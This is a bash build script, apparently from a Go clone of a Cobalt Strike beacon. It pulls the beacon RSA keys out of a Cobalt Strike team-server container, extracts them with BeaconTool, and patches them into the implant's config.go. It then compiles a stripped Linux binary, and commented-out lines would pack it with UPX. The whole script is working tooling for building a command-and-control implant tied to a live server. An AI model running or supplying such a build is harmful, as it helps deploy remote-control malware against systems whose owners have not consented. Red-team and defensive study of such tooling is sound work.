#!/bin/bash

# copy the .cobaltstrike.beacon_keys file to the current directory
docker cp cobaltstrike:/opt/cobaltstrike/.cobaltstrike.beacon_keys .

# extract the keys
export PRIVATE_KEY=$(java --enable-preview -jar tools/BeaconTool/BeaconTool.jar -i .cobaltstrike.beacon_keys -rsa | perl -0777 -ne '/(-----BEGIN PRIVATE KEY-----.+?-----END PRIVATE KEY-----)/sg && print"$1\n"')
export PUBLIC_KEY=$(java --enable-preview -jar tools/BeaconTool/BeaconTool.jar -i .cobaltstrike.beacon_keys -rsa | perl -0777 -ne '/(-----BEGIN PUBLIC KEY-----.+?-----END PUBLIC KEY-----)/sg && print"$1\n"')

# replace the keys in the code
perl -0777 -i -pe 's/-----BEGIN PRIVATE KEY-----.+?-----END PRIVATE KEY-----/$ENV{"PRIVATE_KEY"}/gs' cmd/config/config.go
perl -0777 -i -pe 's/-----BEGIN PUBLIC KEY-----.+?-----END PUBLIC KEY-----/$ENV{"PUBLIC_KEY"}/gs' cmd/config/config.go

# build the program
# docker run -ti --rm -v $PWD/.build-deps:/go/pkg -v $PWD:/usr/src/app golang:buster bash -c \
#     'export GOOS="linux" && \
#     export GOARCH="amd64" && \
#     cd /usr/src/app && \
#     go build -ldflags="-s -w" -gcflags=all="-l -B" cmd/main.go'
#     #    go build cmd/main.go'

export GOOS="linux"
export GOARCH="amd64"
#go build -compiler gccgo cmd/main.go
#go build -compiler gccgo -gccgoflags '-static-libgo' cmd/main.go
go build -ldflags="-s -w" -gcflags=all="-l -B" cmd/main.go

# make it smaller
# upx --brute $(git branch | sed -n -e 's/^\* \(.*\)/\1/p')
# upx --best --ultra-brute $(git branch | sed -n -e 's/^\* \(.*\)/\1/p')
# upx --best --lzma main